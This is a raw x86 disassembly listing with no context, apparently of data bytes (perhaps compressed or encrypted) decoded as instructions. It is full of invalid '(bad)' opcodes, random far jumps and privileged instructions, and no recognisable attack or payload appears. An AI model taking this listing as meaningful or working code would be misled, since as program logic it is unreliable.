  40925d:	mov    bh,BYTE PTR [esi+esi*1+0x79]
  409261:	mov    WORD PTR [edx],gs
  409263:	xor    BYTE PTR [ecx+0x6733bb0],bl
  409269:	sti    
  40926a:	ja     0x40924d
  40926c:	hlt    
  40926d:	inc    esi
  40926e:	jb     0x409218
  409270:	in     al,0xf2
  409272:	inc    ebx
  409273:	cmp    ecx,DWORD PTR [ebp+esi*1+0x1c0ee3fd]
  40927a:	pop    ebx
  40927b:	dec    ebp
  40927c:	call   0xebc2:0x1f975b4f
  409283:	jl     0x409205
  409285:	mov    BYTE PTR [ebp-0x49ee6cb8],ah
  40928b:	push   ecx
  40928c:	pop    ecx
  40928d:	inc    esp
  40928e:	bound  ecx,QWORD PTR [edi-0x5f]
  409291:	or     eax,0x9d32cae4
  409296:	cdq    
  409297:	in     al,dx
  409298:	stos   BYTE PTR es:[edi],al
  409299:	outs   dx,DWORD PTR ds:[esi]
  40929a:	push   eax
  40929b:	pop    eax
  40929c:	and    eax,DWORD PTR [edx]
  40929e:	(bad)  
  40929f:	gs retf 
  4092a1:	(bad)  
  4092a2:	out    0xc7,eax
  4092a4:	xchg   ecx,eax
  4092a5:	popa   
  4092a6:	cdq    
  4092a7:	jp     0x409246
  4092a9:	sub    bh,cl
  4092ab:	(bad)  
  4092ac:	shr    BYTE PTR [esi-0x60],0x26
  4092b0:	test   al,0x34
  4092b2:	(bad)  
  4092b3:	sub    eax,ecx
  4092b5:	shr    al,cl
  4092b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092b8:	fstp   QWORD PTR [ebp+eax*4+0x4]
  4092bc:	mov    ebx,0xc562d8ec
  4092c1:	enter  0xded7,0x6e
  4092c5:	in     eax,0x59
  4092c7:	int    0x2
  4092c9:	mov    ebp,0x3417aa0
  4092ce:	in     al,0xb0
  4092d0:	mov    cl,0xb3
  4092d2:	push   ebp
  4092d3:	lds    ecx,FWORD PTR [esi]
  4092d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092d6:	push   esp
  4092d7:	jge    0x409286
  4092d9:	imul   esp,DWORD PTR [edx+0x7e],0xe74e65be
  4092e0:	xor    eax,0xd0d7cdca
  4092e5:	push   esp
  4092e6:	pop    esp
  4092e7:	stos   BYTE PTR es:[edi],al
  4092e8:	adc    al,0xff
  4092ea:	cmp    BYTE PTR [esi],cl
  4092ec:	outs   dx,BYTE PTR ds:[esi]
  4092ed:	lock pop esp
  4092ef:	sti    
  4092f0:	lahf   
  4092f1:	mov    cl,0x1d
  4092f3:	addr16 dec edx
  4092f5:	mov    eax,DWORD PTR [edi+0x70046592]
  4092fb:	inc    ebx
  4092fc:	jb     0x40935d
  4092fe:	sub    BYTE PTR [ecx+0x67d77dbc],dh
  409304:	sbb    BYTE PTR ds:0x1f1f083e,ah
  40930a:	std    
  40930b:	cwde   
  40930c:	push   ebp
  40930d:	call   0x6ac09892
  409312:	xor    BYTE PTR [ecx-0x1c],al
  409315:	cmp    BYTE PTR [esi-0x73],0xfd
  409319:	xlat   BYTE PTR ds:[bx]
  40931b:	add    BYTE PTR [eax+0x719c1496],al
  409321:	popa   
  409322:	imul   ebp,ebx,0xfffffffe
  409325:	push   edi
  409326:	js     0x4092b6
  409328:	push   ecx
  409329:	add    DWORD PTR [esi+0x64bfdecd],ebx
  40932f:	mov    ebp,0x69659393
  409334:	mov    esp,0x822bdc8c
  409339:	fs fsub st,st(7)
  40933c:	mov    cl,0xa6
  40933e:	shr    BYTE PTR [ecx+0xb4e1d47],cl
  409344:	mov    ?,edi
  409346:	out    dx,al
  409347:	pop    ds
  409348:	das    
  409349:	repnz dec esi
  40934b:	mov    ds,WORD PTR [edx+edi*2]
  40934e:	add    dl,cl
  409350:	xchg   esi,eax
  409351:	fsub   st(1),st
  409353:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409354:	fsub   DWORD PTR [ebp-0x4a]
  409357:	or     DWORD PTR [ebx],edi
  409359:	inc    ecx
  40935a:	aaa    
  40935b:	and    al,0x6
  40935d:	pop    ds
  40935e:	dec    eax
  40935f:	test   DWORD PTR [esi+0x5abfb2d7],0xedfea941
  409369:	dec    esi
  40936a:	lods   al,BYTE PTR ds:[esi]
  40936b:	inc    edi
  40936c:	push   es
  40936d:	mov    ds:0xcb7d5369,eax
  409372:	jae    0x4093cc
  409374:	dec    ebx
  409375:	daa    
  409376:	retf   
  409377:	lds    edx,FWORD PTR [edi+ebp*1-0x11]
  40937b:	jne    0x409314
  40937d:	sub    DWORD PTR [edi],edx
  40937f:	jp     0x409331
  409381:	fsub   QWORD PTR [ebx-0x25c20726]
  409387:	sub    BYTE PTR [edx-0xb],ch
  40938a:	jl     0x4093d0
  40938c:	jl     0x40935f
  40938e:	jns    0x409352
  409390:	push   ebx
  409391:	push   DWORD PTR [ecx-0x2d7d457d]
  409397:	lock xor ebx,edi
  40939a:	ins    BYTE PTR es:[edi],dx
  40939b:	jg     0x4093da
  40939d:	and    al,0xed
  40939f:	cmp    al,0x70
  4093a1:	add    al,0x3
  4093a3:	or     ebx,DWORD PTR [edx+0x2b5bfd15]
  4093a9:	pop    es
  4093aa:	in     eax,dx
  4093ab:	pop    ecx
  4093ac:	cmp    edx,ecx
  4093ae:	daa    
  4093af:	outs   dx,BYTE PTR ds:[esi]
  4093b0:	sub    ch,BYTE PTR [edx-0x7b256d99]
  4093b6:	inc    ecx
  4093b7:	mov    ebx,0x54eeb1ca
  4093bc:	(bad)  
  4093bd:	sbb    al,0xf3
  4093bf:	and    eax,0x90287c9b
  4093c4:	fs cdq 
  4093c6:	test   eax,0xa9d9d23a
  4093cb:	jbe    0x409431
  4093cd:	ficomp DWORD PTR [esi+0x6c87000e]
  4093d3:	fbld   TBYTE PTR [edi-0x4a]
  4093d6:	pop    ds
  4093d7:	jno    0x409393
  4093d9:	dec    ecx
  4093da:	cmp    dl,bh
  4093dc:	pop    edi
  4093dd:	and    eax,0x50f10966
  4093e2:	mov    edx,0x8dfc5a3d
  4093e7:	retf   
  4093e8:	fwait
  4093e9:	and    BYTE PTR [esi],bl
  4093eb:	out    0xb6,al
  4093ed:	test   ah,cl
  4093ef:	mov    ds:0x525de669,eax
  4093f4:	xor    eax,0x80e8b7a8
  4093f9:	js     0x40938c
  4093fb:	loope  0x40938e
  4093fd:	in     eax,0x3
  4093ff:	mov    ch,0x72
  409401:	push   eax
  409402:	and    al,0xc
  409404:	scas   eax,DWORD PTR es:[edi]
  409405:	xlat   BYTE PTR ds:[ebx]
  409406:	call   FWORD PTR [ebp+0x7fa728c2]
  40940c:	add    BYTE PTR [edi+0x6cf62693],al
  409412:	mov    esp,0xf0a1fdd4
  409417:	ss cwde 
  409419:	jmp    0x40940e
  40941b:	aad    0xed
  40941d:	fisttp WORD PTR [edi]
  40941f:	cmp    ah,cl
  409421:	jecxz  0x4093ac
  409423:	call   0xdb741402
  409428:	(bad)  
  409429:	xchg   ebp,eax
  40942a:	or     eax,0xe7e9433b
  40942f:	(bad)  
  409430:	cmp    BYTE PTR [ebp+0xc],dh
  409433:	and    eax,0xd482f1fc
  409438:	js     0x4094a9
  40943a:	fisttp QWORD PTR [eax]
  40943c:	mov    esp,0xf05a1b4e
  409441:	jae    0x409489
  409443:	repnz test BYTE PTR [esi+0x5274a5f4],dh
  40944a:	push   ecx
  40944b:	pop    ecx
  40944c:	into   
  40944d:	cmp    DWORD PTR [ecx+eiz*4-0x7e],esp
  409451:	lods   al,BYTE PTR ds:[esi]
  409452:	bound  edx,QWORD PTR [ebp-0xd1cdca8]
  409458:	sbb    al,0x8e
  40945a:	dec    eax
  40945b:	(bad)  
  40945c:	xchg   edi,eax
  40945d:	stc    
  40945e:	ja     0x4094c1
  409460:	popa   
  409461:	add    BYTE PTR [ebx],0xbc
  409464:	enter  0xd9a6,0xd4
  409468:	in     eax,dx
  409469:	add    DWORD PTR [ebx-0x6482c38a],0xffffffef
  409470:	jmp    0x218d:0x779383f7
  409477:	dec    ecx
  409478:	call   0x6a70:0x89e0e65f
  40947f:	lea    esi,[edx-0x60]
  409482:	jp     0x40949f
  409484:	mov    esp,0xaa9f5146
  409489:	ja     0x4094d9
  40948b:	loopne 0x40948b
  40948d:	sbb    esp,DWORD PTR [edi]
  40948f:	in     al,dx
  409490:	fld    TBYTE PTR [edi]
  409492:	cli    
  409493:	ror    BYTE PTR [ebx],1
  409495:	fld    TBYTE PTR [eax]
  409497:	out    0x9d,al
  409499:	xor    bh,bl
  40949b:	dec    edx
  40949c:	sub    dl,al
  40949e:	int    0x30
  4094a0:	inc    ebp
  4094a1:	fs add al,0x2f
  4094a4:	lods   al,BYTE PTR ds:[esi]
  4094a5:	aad    0x0
  4094a7:	or     DWORD PTR [edi+0x6ddadfa2],ecx
  4094ad:	mov    dl,0x2a
  4094af:	sbb    BYTE PTR [esi],0x10
  4094b2:	dec    ebp
  4094b3:	push   esi
  4094b4:	push   edi
  4094b5:	repnz sbb BYTE PTR ds:[ebp+0x2d],bh
  4094ba:	push   es
  4094bb:	sbb    bl,BYTE PTR [edi-0x51fca95f]
  4094c1:	mov    ah,dl
  4094c3:	xor    BYTE PTR [ecx-0xb9e9951],bl
  4094c9:	sbb    eax,0x4b2d8fbe
  4094ce:	mov    eax,0x56c47e61
  4094d3:	sbb    al,0x9f
  4094d5:	mov    ebx,0xa7ee6e21
  4094da:	xor    eax,0x502f77f5
  4094df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094e0:	stc    
  4094e1:	dec    eax
  4094e2:	gs loop 0x4094f0
  4094e5:	dec    esi
  4094e6:	lds    ebp,FWORD PTR [ecx-0x40]
  4094e9:	retf   
  4094ea:	std    
  4094eb:	and    DWORD PTR [edx+0x7b],esi
  4094ee:	pop    esi
  4094ef:	mov    esp,0x40f484de
  4094f4:	inc    ebx
  4094f5:	cmp    eax,0xb1da65a0
  4094fa:	mov    ch,0x7c
  4094fc:	lock or DWORD PTR [eax+ebx*8-0x7],esi
  409501:	xchg   edi,eax
  409502:	ret    
  409503:	loopne 0x40951b
  409505:	imul   eax,DWORD PTR [edi+0xf],0xffffffc6
  409509:	mov    edi,0x350864a4
  40950e:	adc    cl,cl
  409510:	push   edi
  409511:	stos   BYTE PTR es:[edi],al
  409512:	test   eax,0xd6a5cbbd
  409517:	jo     0x409523
  409519:	sub    BYTE PTR [edx+ecx*4],0xe8
  40951d:	fadd   QWORD PTR ds:0x51148472
  409523:	dec    edi
  409524:	pushf  
  409525:	jp     0x4094d7
  409527:	jecxz  0x4094c8
  409529:	in     eax,dx
  40952a:	push   esi
  40952b:	sub    edi,DWORD PTR [ebx]
  40952d:	pop    ecx
  40952e:	retf   0x9991
  409531:	adc    al,0x8a
  409533:	pop    ebp
  409534:	jle    0x409524
  409536:	push   edi
  409537:	adc    BYTE PTR [eax+0x6dfa0b73],0x33
  40953e:	push   edx
  40953f:	inc    esp
  409540:	gs mov dl,0xaf
  409543:	or     eax,0xeca30e53
  409548:	rcr    DWORD PTR [edx+edi*4+0x4b],1
  40954c:	jmp    0xc233:0x85883669
  409553:	in     al,dx
  409554:	push   ds
  409555:	rcr    DWORD PTR [ebp+edx*4-0x17d87bf8],1
  40955c:	loope  0x4095cc
  40955e:	cld    
  40955f:	loope  0x40955a
  409561:	enter  0x47ce,0x7b
  409565:	shl    bh,0x53
  409568:	cmp    ebx,DWORD PTR [edx-0x7f]
  40956b:	nop
  40956c:	inc    esi
  40956d:	jne    0x409531
  40956f:	into   
  409570:	loop   0x4095ec
  409572:	aas    
  409573:	dec    eax
  409574:	jnp    0x40954b
  409576:	ins    BYTE PTR es:[edi],dx
  409577:	pop    ss
  409578:	mov    ebp,edi
  40957a:	fisttp DWORD PTR [ebx]
  40957c:	mov    dl,0xe1
  40957e:	inc    ebx
  40957f:	test   DWORD PTR [ebx],eax
  409581:	rcr    DWORD PTR [eax],0xda
  409584:	mov    eax,0x17361663
  409589:	neg    BYTE PTR [ecx]
  40958b:	out    dx,eax
  40958c:	(bad)  
  40958d:	(bad)
  409590:	mov    WORD PTR [ebx],cs
  409592:	stos   BYTE PTR es:[edi],al
  409593:	cs call 0xab24e2b4
  409599:	in     eax,0x3c
  40959b:	xchg   ax,ax
  40959d:	push   ds
  40959e:	iret   
  40959f:	xchg   BYTE PTR [eax],dh
  4095a1:	mov    ch,cl
  4095a3:	cmp    al,0x18
  4095a5:	pusha  
  4095a6:	xor    eax,edx
  4095a8:	sub    ch,BYTE PTR [edi+0x14]
  4095ab:	pop    eax
  4095ac:	or     ch,BYTE PTR [ebx+eax*1-0x675d5ac4]
  4095b3:	gs sar ah,cl
  4095b6:	push   edx
  4095b7:	out    0x6,eax
  4095b9:	push   ss
  4095ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095bb:	fbstp  TBYTE PTR [edx+0x48721e41]
  4095c1:	adc    BYTE PTR [esi],bh
  4095c3:	outs   dx,DWORD PTR ds:[esi]
  4095c4:	out    dx,eax
  4095c5:	mov    ds:0x5d4ab2ed,al
  4095ca:	ins    DWORD PTR es:[edi],dx
  4095cb:	add    BYTE PTR [ebp-0x6f6a2a3e],cl
  4095d1:	add    eax,0xdc822a95
  4095d6:	stc    
  4095d7:	push   ds
  4095d8:	mov    dl,0xfb
  4095da:	xchg   edi,eax
  4095db:	frstor [ebx+0x28713105]
  4095e1:	xchg   edi,eax
  4095e2:	test   DWORD PTR [eax+edi*2-0x4c31da3f],0xde4568f7
  4095ed:	sti    
  4095ee:	iret   
  4095ef:	sbb    ebp,DWORD PTR [edi+0x60]
  4095f2:	inc    edx
  4095f3:	stc    
  4095f4:	(bad)  
  4095f5:	pop    ebx
  4095f6:	xor    al,0x5
  4095f8:	popf   
  4095f9:	call   0x461bed97
  4095fe:	aaa    
  4095ff:	jnp    0x4095e5
  409601:	xor    BYTE PTR ds:[esi],bl
  409604:	popa   
  409605:	add    DWORD PTR [edi-0x7e59361],edx
  40960b:	loope  0x409626
  40960d:	jbe    0x4095cc
  40960f:	cmp    BYTE PTR [edx+0x18],al
  409612:	mov    eax,0x588cd853
  409617:	and    dl,bl
  409619:	popf   
  40961a:	add    eax,edi
  40961c:	idiv   DWORD PTR [edi-0x74cb3029]
  409622:	sub    ch,al
  409624:	gs (bad) 
  409626:	loope  0x40965c
  409628:	xor    DWORD PTR [esi-0x2b],0xd
  40962c:	(bad)  
  40962d:	unpcklps xmm7,xmm3
  409630:	inc    eax
  409631:	pop    ebx
  409632:	mov    esi,0x2a5a6bff
  409637:	int    0xcf
  409639:	add    ah,BYTE PTR [ebx]
  40963b:	in     eax,dx
  40963c:	xor    ebp,ebp
  40963e:	and    al,cl
  409640:	fcomp  st(6)
  409642:	jg     0x40962f
  409644:	add    al,0x79
  409646:	or     eax,0xaa8d81ae
  40964b:	(bad)  
  40964c:	outs   dx,DWORD PTR ds:[esi]
  40964d:	pop    ecx
  40964e:	out    dx,al
  40964f:	inc    ebx
  409650:	leave  
  409651:	inc    eax
  409652:	and    BYTE PTR [eax],al
  409654:	adc    bl,BYTE PTR [bp+0x73]
  409658:	mov    cl,0x40
  40965a:	jb     0x4096a8
  40965c:	fbstp  TBYTE PTR [ebp-0x456318a9]
  409662:	mov    bh,0xf7
  409664:	retf   0x2f88
  409667:	pop    ecx
  409668:	icebp  
  409669:	pop    ds
  40966a:	and    eax,0x1d95fda7
  40966f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409670:	push   esi
  409671:	into   
  409672:	dec    edi
  409673:	pop    edi
  409674:	jge    0x40969a
  409676:	mov    WORD PTR [edi-0x5b2fd277],?
  40967c:	cs pop es
  40967e:	jnp    0x409694
  409680:	sti    
  409681:	inc    esp
  409682:	imul   edx,DWORD PTR [ebp-0x26b5d4ab],0x43
  409689:	arpl   WORD PTR [edx],dx
  40968b:	frstor [ebp+0x69928bc5]
  409691:	das    
  409692:	xor    al,0xd8
  409694:	cmp    edi,edx
  409696:	mov    ebx,0x3865810e
  40969b:	sub    eax,0x4fb6f5e8
  4096a0:	int    0xc
  4096a2:	jmp    0x40970d
  4096a4:	jb     0x409707
  4096a6:	aas    
  4096a7:	in     eax,dx
  4096a8:	pop    esi
  4096a9:	or     BYTE PTR [esi],dh
  4096ab:	mov    dh,0x5d
  4096ad:	jmp    0x96dfffb0
  4096b2:	add    DWORD PTR cs:[ebx+0x2a85e8a3],esi
  4096b9:	push   0x99bfa7df
  4096be:	xchg   DWORD PTR [edx],edx
  4096c0:	xor    DWORD PTR [ecx],ecx
  4096c2:	rcr    BYTE PTR [esi+0x35],cl
  4096c5:	and    ch,BYTE PTR [esi]
  4096c7:	test   ch,ch
  4096c9:	sbb    DWORD PTR [ebx-0x47],0x1f
  4096cd:	sub    eax,0x93934835
  4096d2:	add    eax,0x258f6cf4
  4096d7:	inc    edx
  4096d8:	add    ch,BYTE PTR [edi]
  4096da:	clc    
  4096db:	stos   DWORD PTR es:[edi],eax
  4096dc:	sub    BYTE PTR [eax+eiz*2],bh
  4096df:	mov    DWORD PTR ss:[ebx+0x37],edx
  4096e3:	or     esi,DWORD PTR [ecx-0x58]
  4096e6:	(bad)  [edx]
  4096e8:	mov    ah,0x3d
  4096ea:	inc    ebp
  4096eb:	cmc    
  4096ec:	mov    al,ds:0x60e76e3d
  4096f1:	imul   eax,DWORD PTR [ebx-0x5b],0x43
  4096f5:	frstor [edi]
  4096f7:	lock call 0xe1f8:0x37693d75
  4096ff:	daa    
  409700:	into   
  409701:	add    ecx,DWORD PTR [edi]
  409703:	xchg   ebp,eax
  409704:	push   ss
  409705:	int3   
  409706:	inc    esp
  409707:	(bad)  
  409708:	in     al,dx
  409709:	aam    0xb5
  40970b:	push   edx
  40970c:	dec    ecx
  40970d:	xchg   edi,eax
  40970e:	jns    0x409765
  409710:	imul   eax,DWORD PTR [ebx+eiz*8+0x7320063],0x62
  409718:	pop    esp
  409719:	call   0xc6c813b
  40971e:	push   esi
  40971f:	push   esi
  409720:	push   ecx
  409721:	add    al,0x41
  409723:	jle    0x409774
  409725:	aam    0x6c
  409727:	(bad)  
  409728:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409729:	and    al,0x40
  40972b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40972c:	add    DWORD PTR [edi+0x17],edx
  40972f:	push   ecx
  409730:	add    eax,0xdbcf77d9
  409735:	or     eax,0xe19dd1db
  40973a:	js     0x4097a2
  40973c:	add    al,0xae
  40973e:	xchg   ebp,eax
  40973f:	xchg   esi,eax
  409740:	or     al,0x61
  409742:	aaa    
  409743:	test   BYTE PTR [edi-0x4],al
  409746:	je     0x409797
  409748:	and    eax,0x85fc0f1a
  40974d:	aaa    
  40974e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40974f:	cmp    eax,0x358b450c
  409754:	lock inc eax
  409756:	lds    ebp,FWORD PTR [edi+0x70]
  409759:	cmp    cl,BYTE PTR [ecx]
  40975b:	sub    ebp,DWORD PTR [ecx]
  40975d:	xor    eax,0x751eaa51
  409762:	inc    ecx
  409763:	rcl    BYTE PTR [esi],1
  409765:	rcl    BYTE PTR [edx+0xe3041fb],1
  40976b:	xchg   esp,eax
  40976c:	pushf  
  40976d:	dec    eax
  40976e:	mov    bl,0xd
  409770:	out    dx,al
  409771:	or     BYTE PTR [ecx-0x4],dh
  409774:	push   0xffffffe4
  409776:	popf   
  409777:	in     eax,0x22
  409779:	sub    dh,BYTE PTR [edx]
  40977b:	inc    ebx
  40977c:	push   esi
  40977d:	icebp  
  40977e:	jbe    0x409738
  409780:	or     al,0xd
  409782:	jo     0x409786
  409784:	out    dx,al
  409785:	stos   DWORD PTR es:[edi],eax
  409786:	shl    dh,0x33
  409789:	or     BYTE PTR [ecx+0x1d],bh
  40978c:	inc    edx
  40978d:	shl    DWORD PTR [eax+0x40cea7d9],cl
  409793:	aaa    
  409794:	xchg   ebx,eax
  409795:	dec    ebp
  409796:	add    BYTE PTR [eax+0x59b7b6cd],cl
  40979c:	pop    eax
  40979d:	call   DWORD PTR [edx-0x14]
  4097a0:	lods   al,BYTE PTR ds:[esi]
  4097a1:	mov    bh,0x13
  4097a3:	retf   
  4097a4:	mul    BYTE PTR [esi]
  4097a6:	aaa    
  4097a7:	cli    
  4097a8:	add    DWORD PTR [edi-0x3a],edx
  4097ab:	mov    WORD PTR [ecx],es
  4097ad:	sbb    ebp,DWORD PTR [ebp+0x8]
  4097b0:	es pop esp
  4097b2:	pop    eax
  4097b3:	stc    
  4097b4:	bound  eax,QWORD PTR [ebx-0x44d01072]
  4097ba:	jo     0x4097e6
  4097bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097bd:	mov    al,ds:0xf503384e
  4097c2:	xchg   edi,eax
  4097c3:	sbb    al,0x71
  4097c5:	(bad)  [ebp+0x4d]
  4097c8:	mov    cl,BYTE PTR [eax+0x45da62da]
  4097ce:	cmp    cl,BYTE PTR [esp+ebx*4+0x45]
  4097d2:	rol    bl,cl
  4097d4:	ja     0x4097a4
  4097d6:	xor    ebx,0x379e8a67
  4097dc:	(bad)  
  4097dd:	xor    eax,0x5cfb2075
  4097e2:	inc    esi
  4097e4:	scas   eax,DWORD PTR es:[edi]
  4097e5:	dec    edi
  4097e6:	das    
  4097e7:	xor    ah,BYTE PTR [ebp+0x38bcad89]
  4097ed:	cmp    eax,0xb15f7b07
  4097f2:	jno    0x40984e
  4097f4:	push   ebx
  4097f5:	and    eax,0x98843e88
  4097fa:	mov    dh,0xb8
  4097fc:	jbe    0x4097c2
  4097fe:	mov    al,ds:0x2a7aa00a
  409803:	pop    ebp
  409804:	pop    esp
  409805:	dec    edi
  409806:	jge    0x4097ab
  409808:	add    dh,bh
  40980a:	cwde   
  40980b:	adc    al,0x52
  40980d:	cmc    
  40980e:	cmp    esp,DWORD PTR [ebx+0x2c6d3af]
  409814:	je     0x409880
  409816:	sbb    BYTE PTR [eax-0x6176c316],cl
  40981c:	sub    BYTE PTR [ebp+0x31c289f6],bh
  409822:	call   0xd36615fa
  409827:	adc    DWORD PTR [esi],esp
  409829:	rcl    BYTE PTR [edi-0x274ac7a],cl
  40982f:	enter  0xf34e,0x96
  409833:	mov    al,ds:0x33b9a20
  409838:	(bad)  
  409839:	fld    DWORD PTR [edi+0x104dfa]
  40983f:	sub    DWORD PTR [edx+0x10],eax
  409842:	addr16 push esp
  409844:	fild   QWORD PTR [esi-0xadd18c4]
  40984a:	push   ebx
  40984b:	mov    esi,edx
  40984d:	idiv   DWORD PTR [esi+ecx*1]
  409850:	fs call 0x8fd5:0x4765acf4
  409858:	scas   al,BYTE PTR es:[edi]
  409859:	mov    BYTE PTR [bp+di],0x9b
  40985d:	sbb    DWORD PTR [ebp-0x12878a7],0x38
  409864:	out    0x2e,al
  409866:	(bad)  
  409867:	stc    
  409868:	stc    
  409869:	jmp    0x476:0xac3a5b1b
  409870:	mov    esp,0x543863da
  409875:	pusha  
  409876:	adc    eax,0x9a5f7556
  40987b:	jge    0x4098f4
  40987d:	jecxz  0x40983c
  40987f:	lock jg 0x409821
  409882:	int3   
  409883:	addr16 in al,0xb3
  409886:	and    esi,edx
  409888:	repz iret 
  40988a:	fidiv  DWORD PTR [ebx]
  40988c:	fwait
  40988d:	jae    0x409877
  40988f:	daa    
  409890:	inc    edx
  409891:	data16 cmc 
  409893:	stos   BYTE PTR es:[edi],al
  409894:	lahf   
  409895:	jns    0x4098d5
  409897:	add    DWORD PTR [edi],ecx
  409899:	lahf   
  40989a:	push   0x64
  40989c:	or     ecx,DWORD PTR [eax]
  40989e:	inc    ebx
  40989f:	xchg   esi,eax
  4098a0:	in     al,dx
  4098a1:	leave  
  4098a2:	bound  esp,QWORD PTR [ebx]
  4098a4:	jge    0x409832
  4098a6:	ss jmp 0x429:0xfb028e97
  4098ae:	sub    al,0x6d
  4098b0:	jnp    0x4098e9
  4098b2:	loope  0x409865
  4098b4:	jp     0x409891
  4098b6:	fmul   QWORD PTR [ebp+0x43]
  4098b9:	test   DWORD PTR [edx+0x58],esi
  4098bc:	xor    al,0x28
  4098be:	add    al,0xc3
  4098c0:	cmc    
  4098c1:	cmp    dh,dh
  4098c3:	jmp    0xa4ade038
  4098c8:	inc    eax
  4098c9:	repnz test BYTE PTR ds:0x325db088,cl
  4098d0:	sub    ch,bl
  4098d2:	stos   DWORD PTR es:[edi],eax
  4098d3:	lea    ecx,[eax-0x2b]
  4098d6:	and    esi,edx
  4098d8:	lds    eax,FWORD PTR [edi-0x6c6acc78]
  4098de:	adc    al,0x1f
  4098e0:	in     al,dx
  4098e1:	cmp    DWORD PTR [edx-0x13],0x19
  4098e5:	and    DWORD PTR [edi+eiz*4-0x37],esi
  4098e9:	push   edi
  4098ea:	test   eax,0x2753d622
  4098ef:	addr16 mov al,ss:0x663b
  4098f4:	and    eax,0x240dfaa5
  4098f9:	out    0x22,al
  4098fb:	jl     0x409979
  4098fd:	jb     0x4098d5
  4098ff:	pop    esi
  409900:	loope  0x409970
  409902:	arpl   WORD PTR [edx-0x584b79ea],di
  409908:	in     eax,dx
  409909:	pop    ebx
  40990a:	in     al,0x52
  40990c:	out    0x7f,al
  40990e:	test   al,0x4f
  409910:	push   esp
  409911:	in     eax,0xfe
  409913:	sahf   
  409914:	(bad)  
  409915:	jle    0x40998d
  409917:	adc    cl,BYTE PTR [edx+0x50da1080]
  40991d:	cmp    eax,0x7514ac36
  409922:	bound  eax,QWORD PTR [edi+0x6767a23d]
  409928:	iret   
  409929:	xchg   ebp,eax
  40992a:	aaa    
  40992b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40992c:	lahf   
  40992d:	mov    ah,0x20
  40992f:	test   al,0x7c
  409931:	dec    edi
  409932:	outs   dx,BYTE PTR ds:[esi]
  409933:	das    
  409934:	sar    BYTE PTR ds:[ebp+0x2e],1
  409938:	imul   ebx,DWORD PTR [esi+edi*4+0x71],0x8195e8b1
  409940:	jg     0x4099a6
  409942:	xchg   esi,eax
  409943:	xor    eax,0xac082ddf
  409948:	ins    DWORD PTR es:[edi],dx
  409949:	outs   dx,DWORD PTR ds:[esi]
  40994a:	leave  
  40994b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40994c:	and    eax,esp
  40994e:	xchg   esi,eax
  40994f:	jns    0x4098db
  409951:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409952:	jae    0x40994d
  409954:	ficomp DWORD PTR [esi+0x4b0ccdb9]
  40995a:	fdiv   DWORD PTR [edi+0x51ef853f]
  409960:	or     edi,DWORD PTR [esi]
  409962:	outs   dx,BYTE PTR ds:[esi]
  409963:	or     al,0xb1
  409965:	arpl   WORD PTR [esi],bx
  409967:	repnz push ebp
  409969:	push   cs
  40996a:	inc    ebp
  40996b:	retf   0xe866
  40996e:	(bad)  
  40996f:	stos   DWORD PTR es:[edi],eax
  409970:	push   es
  409971:	mov    ds:0x60e89c90,eax
  409976:	inc    ebx
  409977:	rol    BYTE PTR [ebx-0x7b],0xdc
  40997b:	inc    di
  40997d:	jo     0x409910
  40997f:	iret   
  409980:	jmp    0x4099b8
  409982:	push   ss
  409983:	xchg   BYTE PTR [esi],bl
  409985:	pop    ebx
  409986:	pusha  
  409987:	les    edx,FWORD PTR [ecx+0xf]
  40998a:	or     BYTE PTR [edx-0x4f830eb3],ch
  409990:	arpl   WORD PTR [edi+ecx*4+0x30594d56],cx
  409997:	adc    DWORD PTR [ebp+0x502c86ea],edi
  40999d:	cmp    al,0x5b
  40999f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099a0:	mov    ds:0xe2dce58d,eax
  4099a5:	inc    edi
  4099a6:	mov    al,ds:0xe0a566f
  4099ab:	inc    ebp
  4099ac:	xor    bl,BYTE PTR [edx-0x41700797]
  4099b2:	mov    dh,0xbb
  4099b4:	adc    DWORD PTR [eax-0x7f],0x3c31c5c3
  4099bb:	fsubr  DWORD PTR [ecx-0x4b]
  4099be:	and    al,0x3b
  4099c0:	pop    ss
  4099c1:	cli    
  4099c2:	daa    
  4099c3:	dec    ebx
  4099c4:	add    al,0x4a
  4099c6:	sti    
  4099c7:	sub    dl,BYTE PTR [ecx+0x7ca58423]
  4099cd:	jne    0x409a49
  4099cf:	pop    edi
  4099d0:	dec    eax
  4099d1:	pusha  
  4099d2:	sbb    edx,eax
  4099d4:	xchg   edi,eax
  4099d5:	push   0xffffffe2
  4099d7:	(bad)  
  4099d8:	popa   
  4099d9:	pop    ebp
  4099da:	fldcw  WORD PTR [ecx]
  4099dc:	in     al,dx
  4099dd:	jl     0x409979
  4099df:	js     0x4099ed
  4099e1:	cmp    BYTE PTR [ecx],bl
  4099e3:	mov    dl,0x64
  4099e5:	ret    0xafba
  4099e8:	std    
  4099e9:	xchg   ecx,eax
  4099ea:	pop    eax
  4099eb:	or     cl,BYTE PTR [edi]
  4099ed:	adc    eax,0xb95ed8c
  4099f2:	dec    eax
  4099f3:	mov    esp,0xe4c3a3e2
  4099f8:	ja     0x4099da
  4099fa:	push   0xffffffe8
  4099fc:	and    BYTE PTR [esi-0x41],0x3b
  409a00:	and    ecx,DWORD PTR [edi+ebx*2+0x2b]
  409a04:	imul   ebx,DWORD PTR [esi+0x9],0x2f
  409a08:	hlt    
  409a09:	(bad)  
  409a0a:	xlat   BYTE PTR ds:[ebx]
  409a0b:	pop    ebp
  409a0d:	cdq    
  409a0e:	mov    ebp,0x666182cc
  409a13:	mov    ebx,0x50bd279f
  409a18:	(bad)  
  409a19:	aas    
  409a1a:	add    BYTE PTR [esi],0x1d
  409a1d:	(bad)  
  409a1e:	lock mov edi,0xc3428a57
  409a24:	jns    0x4099dc
  409a26:	imul   edx,DWORD PTR [edi+esi*2],0x45
